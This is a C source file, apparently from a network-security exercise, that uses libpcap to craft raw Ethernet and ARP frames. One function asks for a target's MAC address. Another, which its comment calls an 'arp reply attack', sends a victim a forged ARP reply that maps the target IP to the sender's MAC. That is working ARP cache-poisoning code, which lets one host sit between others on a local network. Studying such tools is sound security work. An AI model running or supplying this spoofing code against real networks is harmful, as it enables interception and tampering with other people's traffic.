#include <pcap/pcap.h>
#include "all_pcap.h"

//open pcap handler
int init_handle(pcap_arg *arg, char *dev)
{
    char errbuf[PCAP_ERRBUF_SIZE];

    if(dev == nullptr)
    {
        printf("Can not find device!!");

        return RET_ERR;
    }

    arg->net =0;
    arg->mask=0;

    arg->hand = pcap_open_live(dev, 42, 1, 1000, errbuf);
    if(arg->hand == nullptr)
    {
        printf(" Can not open device!!");
        return RET_ERR;
    }

    return RET_SUC;
}

//set handle arp
int set_handle_arp(pcap_arg *arg)
{
    struct bpf_program filter;

    if(pcap_compile(arg->hand, &filter, "arp", 1, arg->net) == -1)
    {
        printf("Can not set handle arp!!");
        return RET_ERR;
    }

    if(pcap_setfilter(arg->hand, &filter) == -1)
    {
        printf("Can not install pcap fillter!!");
        return RET_ERR;
    }

    return RET_SUC;
}
//close pcap handler
int close_handle(pcap_arg *arg)
{
    pcap_close(arg->hand);
    return RET_SUC;
}

//send arp request

/*
 *1. GET target Mac Address
 *
 *
 * shost: my Mac Address
 * dhost: ff ff ff ff ff ff
 * etype: ARP
 *
 * opcode: request
 *
 * sender hw addr: My  MAC Address
 * sender pt addr: MY IP Address
 * target hw addr : 00 00 00 00 00 00 00
 * target pt addr : Target IP Address
 *
 * u_char sha[HWADDR_LEN];      // Sender Hardware Address

    u_char spa[PTADDR_LEN];      // Sender Protocol Address

    u_char tha[HWADDR_LEN];      // Target Hardware Address

    u_char tpa[PTADDR_LEN];      // Target Protocol Address
 *
 */
int send_arp_request(pcap_arg *arg, char *addr_s)
{
    struct ether_header ehdr;
    struct arp_header ahdr;
    struct in_addr addr;

    memset(ehdr.ether_dhost, 0xff, HWADDR_LEN);
    memcpy(ehdr.ether_shost, arg->local_mac, HWADDR_LEN);

    ehdr.ether_type = htons(ETHERTYPE_ARP);

    ahdr.op = htons(ARP_REQUEST);

    //sender Hdware, Protocol
    memcpy(ahdr.sha, arg->local_mac,HWADDR_LEN);
    memcpy(ahdr.spa, &(arg->local_ip), PTADDR_LEN);

    //target Hdware, Protocol
    memset(ahdr.tha, 0x00,HWADDR_LEN);
    inet_pton(AF_INET, addr_s, &addr);
    memcpy(ahdr.tpa, &addr, PTADDR_LEN);
    memcpy(&(arg->sender_ip), &addr, sizeof (struct in_addr));

    if(send_arp_packet(arg, &ehdr, &ahdr))
    {
        return RET_ERR;
    }

    return RET_SUC;
}

//send arp reply
/*
 *
 * 2. arp reply attack
 *
 *
 *
 * shost: my MAC Address
 * dhost: victim MAC Address
 *
 *
 * etype: ARP
 *
 * opcode : reply
 *
 * sender hw addr: my MAC Address
 * sender pt addr: target ip address
 *
 *
 * target hw addr: victim MAC Address
 * target pt addr: victim ip address
 *
 * * u_char sha[HWADDR_LEN];      // Sender Hardware Address

    u_char spa[PTADDR_LEN];      // Sender Protocol Address

    u_char tha[HWADDR_LEN];      // Target Hardware Address

    u_char tpa[PTADDR_LEN];      // Target Protocol Address
 *
 */
int send_arp_reply(pcap_arg *arg, struct arp_header *ahdr, char *addr_t)
{
    struct ether_header ehdr;
    struct arp_header phdr;
    struct in_addr addr;

    memcpy(ehdr.ether_shost,arg->local_mac, HWADDR_LEN);
    memcpy(ehdr.ether_dhost, ahdr->sha, HWADDR_LEN);
    ehdr.ether_type = htons(ETHERTYPE_ARP);

    phdr.op = htons(ARP_REPLY);

    memcpy(phdr.sha, arg->local_mac, HWADDR_LEN);
    inet_pton(AF_INET,addr_t, &addr);
    memcpy(phdr.spa, &addr, PTADDR_LEN);
    memcpy(phdr.tha, ahdr->sha, HWADDR_LEN);
    memcpy(phdr.tpa, ahdr->spa, PTADDR_LEN);

    if(send_arp_packet(arg, &ehdr, &phdr))
    {
        return RET_ERR;
    }

    return  RET_SUC;

}

//send arp packet
int send_arp_packet(pcap_arg *arg, struct ether_header *ehdr, struct arp_header *ahdr)
{
    u_char frame[ETH_HEADER_LEN + ARP_HEADER_LEN];
    build_ether(frame, ehdr);
    build_arp(frame + ETH_HEADER_LEN, ahdr);

    pr_out("Send Packet! :");
    dumpcode(frame, sizeof (frame));
    printf("\n");
    if(pcap_sendpacket(arg->hand,frame, sizeof (frame)) == -1)
    {
        printf("pcap_sendpacket error!!");
        return RET_ERR;
    }

    return RET_SUC;


}

//received arp packet
int recv_arp_packet(pcap_arg *arg, struct arp_header *ahdr)
{
    struct pcap_pkthdr *header;
    const u_char *frame, *packet;
    int ret_next;
    int i;

    for (i =0; i< RECV_ITER_N;i++)
    {
        ret_next = pcap_next_ex(arg->hand, &header, &frame);

        if(ret_next == 0)
        {
            printf("timeout");
            continue;
        }
        if (ret_next !=1)
        {
            printf ("pcap next error!!");
            return RET_ERR;
        }

        if(frame == nullptr)
        {
            printf("Could not get packet");
        }

        if(parsing_ethernet(frame))
        {
            memset(ahdr,0, sizeof (struct arp_header));
            pr_out("received packet: ");
            dumpcode(frame, header->len);
            printf("\n");
            packet = frame + ETH_HEADER_LEN;
            parsing_arp(packet, ahdr);

            if(!memcmp(&(ahdr->spa), &(arg->sender_ip), sizeof (struct in_addr)))
            {
                return RET_SUC;
            }
            else {
                pr_out("received unwanted reply packet");
                printf("=============================================\n");
                continue;

            }

        }
        else {
            printf("arp filter has problem");
            return RET_ERR;
        }

    }

    printf("received: could not find sender!!");
    return RET_ERR;
}
